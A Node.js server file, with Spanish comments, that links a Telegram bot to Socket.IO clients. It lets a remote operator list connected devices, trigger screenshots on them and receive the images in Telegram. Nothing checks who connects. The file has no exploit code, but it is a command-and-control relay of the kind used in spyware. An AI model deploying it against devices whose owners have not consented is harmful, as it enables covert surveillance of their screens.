const { Telegraf } = require('telegraf');
const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();
const server = createServer(app);

// Mapa mejorado para dispositivos conectados
const connectedDevices = new Map();
let lastActivityTime = new Map();

const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.get('/', (req, res) => {
    res.send('Monitor Server Running');
});

// Comandos del bot mejorados
bot.command('start', (ctx) => {
    ctx.reply(
        '🎮 Monitor Remoto\n\n' +
        'Comandos disponibles:\n' +
        '/screen - Toma captura de pantalla\n' +
        '/devices - Muestra dispositivos conectados\n' +
        '/status - Estado del servidor'
    );
});

bot.command('devices', (ctx) => {
    const devices = Array.from(connectedDevices.keys());
    if (devices.length === 0) {
        ctx.reply('❌ No hay dispositivos conectados');
    } else {
        const deviceList = devices.map((id, index) => {
            const lastActivity = lastActivityTime.get(id);
            const timeAgo = lastActivity ? Math.floor((Date.now() - lastActivity) / 1000 / 60) : 'N/A';
            return `${index + 1}. Dispositivo ${id.slice(0, 6)} - Última actividad: hace ${timeAgo} minutos`;
        }).join('\n');
        ctx.reply(`📱 Dispositivos conectados:\n${deviceList}`);
    }
});

bot.command('status', (ctx) => {
    const deviceCount = connectedDevices.size;
    const status = deviceCount > 0 ? '🟢 Activo' : '🔴 Sin dispositivos';
    ctx.reply(`Estado del servidor: ${status}\nDispositivos conectados: ${deviceCount}`);
});

bot.command('screen', async (ctx) => {
    console.log('📸 Comando screen recibido');
    console.log('Dispositivos conectados:', connectedDevices.size);
    
    if (connectedDevices.size === 0) {
        return ctx.reply('❌ No hay dispositivos conectados');
    }
    
    const devices = Array.from(connectedDevices.values());
    const socket = devices[0]; // Tomamos el primer dispositivo
    
    try {
        ctx.reply('📸 Solicitando captura de pantalla...');
        socket.emit('takeScreenshot', { chatId: ctx.chat.id });
        console.log('Solicitud de captura enviada al dispositivo');
    } catch (error) {
        console.error('Error al solicitar captura:', error);
        ctx.reply('❌ Error al solicitar la captura');
    }
});

// Manejo mejorado de conexiones Socket.IO
io.on('connection', (socket) => {
    console.log('🟢 Nueva conexión recibida:', socket.id);
    
    // Registramos el dispositivo inmediatamente
    connectedDevices.set(socket.id, socket);
    lastActivityTime.set(socket.id, Date.now());
    console.log('Dispositivos conectados:', connectedDevices.size);

    socket.on('disconnect', () => {
        console.log('🔴 Dispositivo desconectado:', socket.id);
        connectedDevices.delete(socket.id);
        lastActivityTime.delete(socket.id);
        console.log('Dispositivos restantes:', connectedDevices.size);
    });

    socket.on('screenshotTaken', async (data) => {
        try {
            console.log('📸 Recibida captura de pantalla');
            const imageBuffer = Buffer.from(data.image, 'base64');
            await bot.telegram.sendPhoto(data.chatId, { 
                source: imageBuffer,
                caption: '✅ Captura de pantalla'
            });
            console.log('✅ Captura enviada al chat');
        } catch (error) {
            console.error('Error al enviar screenshot:', error);
            bot.telegram.sendMessage(data.chatId, '❌ Error al enviar la captura: ' + error.message);
        }
    });

    socket.on('activity', (data) => {
        lastActivityTime.set(socket.id, Date.now());
        console.log('💓 Actividad recibida del dispositivo:', socket.id);
    });

    socket.on('error', (data) => {
        console.error('❌ Error del cliente:', data.error);
        if (data.chatId) {
            bot.telegram.sendMessage(data.chatId, '❌ Error del dispositivo: ' + data.error);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Servidor iniciado en puerto ${PORT}`);
});

bot.launch().then(() => console.log('🤖 Bot de Telegram iniciado'));

// Manejo de errores y cierre limpio
process.on('unhandledRejection', (error) => {
    console.error('Error no manejado:', error);
});

process.once('SIGINT', () => {
    bot.stop('SIGINT');
    server.close();
});

process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    server.close();
});

